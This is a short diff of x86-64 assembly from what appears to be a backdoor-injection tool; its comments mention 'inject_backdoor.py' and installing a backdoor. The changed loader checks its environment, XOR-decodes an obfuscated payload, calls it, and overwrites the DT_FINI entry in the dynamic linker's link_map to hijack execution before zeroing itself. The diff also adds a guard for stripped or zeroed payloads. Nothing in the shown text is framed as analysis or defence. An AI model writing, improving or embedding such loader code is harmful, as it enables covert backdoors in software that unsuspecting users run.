@@ -44,18 +44,19 @@ env_check_loop:
     jmp env_check_loop
 
 env_check_okay:
-    // Overwrite dl_info[DT_FINI] in link_map
-    mov rdi, [rbx-8]
-    mov rax, [rbx]
-    stosq
-
     // Decode payload
-    movqq rcx, PAYLOAD_SIZE_IN_WORDS
+    movqq rcx, (PAYLOAD_SIZE_IN_WORDS - 1)
     // lea rdi, [rbx+(_end-_begin)+8+8] GNU AS outputs 488dba6d000000, why ._.
     .byte 0x48, 0x8d, 0x7b, (_end-_begin)+8+8
     xor eax, eax
 decode_loop:
     xor [rdi+rcx*4], eax
+    // If the payload is somehow zeroed (for example, stripped or loaded by WSL 1),
+    // we should not install the backdoor.
+    // This could be done in two bytes (!) by exiting immediately if decoded
+    // dword is zero: our obfuscation decodes all zero to all zero, and we
+    // check that there are no aligned zero dword in inject_backdoor.py
+    jz bye
     add eax, [rdi+rcx*4]
     loop decode_loop
 
@@ -63,6 +64,11 @@ decode_loop:
     lea rdi, [rdi+PAYLOAD_TIME_IMM_OFFSET]
     // call [rbx+(_end-_begin)+8], the same thing again ._.
     .byte 0xff, 0x53, (_end-_begin)+8
+
+    // Overwrite dl_info[DT_FINI] in link_map
+    mov rdi, [rbx-8]
+    mov rax, [rbx]
+    stosq
 bye:
     // Zeroing self
     movqq rdi, rbx
